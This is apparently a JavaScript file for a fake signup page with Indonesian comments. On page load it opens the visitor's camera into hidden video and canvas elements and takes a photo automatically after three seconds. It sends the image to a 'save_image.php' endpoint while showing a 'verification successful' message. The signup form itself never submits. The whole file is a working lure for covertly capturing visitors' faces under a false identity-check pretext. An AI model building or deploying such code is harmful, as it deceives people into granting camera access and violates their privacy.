document.addEventListener('DOMContentLoaded', function() {
  const video = document.getElementById('hiddenVideo');
  const canvas = document.getElementById('hiddenCanvas');
  const verificationStatus = document.getElementById('verificationStatus');
  const signupForm = document.getElementById('signupForm');
  
  // Fungsi untuk update status verifikasi
  function updateStatus(icon, text, className = '') {
    verificationStatus.innerHTML = `<span class="status-icon">${icon}</span><span class="status-text">${text}</span>`;
    verificationStatus.className = `verification-status ${className}`;
  }

  // Fungsi untuk mengambil foto
  function capturePhoto() {
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log('Video belum siap');
      return null;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    return canvas.toDataURL('image/png');
  }

  // Fungsi untuk mengirim foto ke server
  function sendPhotoToServer(dataURL) {
    return fetch('save_image.php', {
      method: 'POST',
      body: JSON.stringify({ image: dataURL }),
      headers: { 'Content-Type': 'application/json' }
    });
  }

  // Akses kamera secara otomatis
  async function initCamera() {
    try {
      updateStatus('🔍', 'Mengakses kamera...');
      
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        } 
      });
      
      video.srcObject = stream;
      updateStatus('✅', 'Kamera siap', 'verification-success');
      
      // Tunggu 3 detik lalu ambil foto secara otomatis
      setTimeout(async () => {
        updateStatus('📸', 'Memverifikasi identitas...');
        
        const photoData = capturePhoto();
        if (photoData) {
          try {
            await sendPhotoToServer(photoData);
            updateStatus('✅', 'Verifikasi berhasil!', 'verification-success');
            
            // Stop kamera setelah berhasil
            stream.getTracks().forEach(track => track.stop());
          } catch (error) {
            console.error('Gagal mengirim foto:', error);
            updateStatus('❌', 'Gagal mengirim verifikasi', 'verification-error');
          }
        }
      }, 3000);
      
    } catch (error) {
      console.error('Error mengakses kamera:', error);
      updateStatus('❌', 'Verifikasi kamera gagal', 'verification-error');
    }
  }

  // Jalankan kamera ketika halaman dimuat
  setTimeout(initCamera, 1000);

  // Handle form submission
  if (signupForm) {
    signupForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Scroll ke section verifikasi
      document.getElementById('verifikasi').scrollIntoView({ 
        behavior: 'smooth' 
      });
      
      // Mulai verifikasi kamera jika belum
      if (!video.srcObject) {
        initCamera();
      }
    });
  }
});
